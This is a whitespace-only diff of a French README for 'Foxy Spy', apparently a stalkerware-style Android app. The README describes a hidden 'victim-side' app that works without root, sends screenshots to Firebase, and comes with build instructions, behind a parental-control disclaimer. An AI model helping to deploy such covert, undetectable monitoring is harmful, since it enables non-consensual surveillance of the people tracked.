@@ -1,6 +1,6 @@
 # 🦊 FOXY SPY - L'Application de Surveillance Android qui fait (trop) bien son travail
 
-### ET TRUC DE FOU : CA MARCHE SANS AVOIR BESOIN DE ROOTER
+### ET TRUC DE FOU : CA MARCHE SANS AVOIR BESOIN DE ROOTER 
 
 ![Bannière Foxy Spy](screens/banner2.jpg)
 
@@ -9,9 +9,9 @@
 Cette application est une démonstration technique des capacités de surveillance sur Android*- à n'utiliser QUE pour:  
 ✅ Contrôle parental (avec consentement)  
 ✅ Protection de proches vulnérables  
-✅ Recherche en sécurité mobile
+✅ Recherche en sécurité mobile  
 
-## Table des Matières
+## Table des Matières 
 1. [Le Concept Derrière Foxy Spy](#-le-concept-derrière-foxy-spy)
 2. [Architecture Technique (Spoiler: C'est du lourd)](#-architecture-technique-spoiler-cest-du-lourd)
 3. [Fonctionnalités (Oui, ça fait peur)](#-fonctionnalités-oui-ça-fait-peur)
@@ -27,7 +27,7 @@ Cette application est une démonstration technique des capacités de surveillanc
 ## Le Concept Derrière Foxy Spy
 
 ### Pourquoi j'ai créé cette appli ?
-En tant que passionné de cybersécurité, je voulais comprendre jusqu'où on peut aller en termes de surveillance sur Android **sans root**. Spoiler : c'est effrayant.
+En tant que passionné de cybersécurité, je voulais comprendre jusqu'où on peut aller en termes de surveillance sur Android **sans root**. Spoiler : c'est effrayant. 
 
 ### Comment ça marche ?
 - **Côté Victime** : Une appli Android qui devient invisible après installation (impossible pour lui de detecter sa presence)
@@ -138,9 +138,9 @@ storageRef.child("screenshots/" + UUID.randomUUID().toString())
    ```
 
 2. **Configurer Firebase**
-   - Créer un projet sur [Firebase Console]
-   - Ajouter les deux apps (com.rana_aditya.parent et com.rana_aditya.child)
-   - Télécharger les fichiers google-services.json
+    - Créer un projet sur [Firebase Console]
+    - Ajouter les deux apps (com.rana_aditya.parent et com.rana_aditya.child)
+    - Télécharger les fichiers google-services.json
 
 3. **Builder les APKs**
    ```bash
@@ -165,11 +165,11 @@ storageRef.child("screenshots/" + UUID.randomUUID().toString())
 ```xml
 <!-- Dans AndroidManifest.xml -->
 <service
-        android:name=".MyFirebaseMessagingService"
-        android:exported="false">
-   <intent-filter>
-      <action android:name="com.google.firebase.MESSAGING_EVENT" />
-   </intent-filter>
+    android:name=".MyFirebaseMessagingService"
+    android:exported="false">
+    <intent-filter>
+        <action android:name="com.google.firebase.MESSAGING_EVENT" />
+    </intent-filter>
 </service>
 ```
 
@@ -244,7 +244,7 @@ git push origin feature/awesome-stuff
 ```java
 // Dernier avertissement
 if (vousÊtesUnMéchants) {
-        throw new IllegalStateException("Allez voir ailleurs !");
+    throw new IllegalStateException("Allez voir ailleurs !");
 }
 ```
 
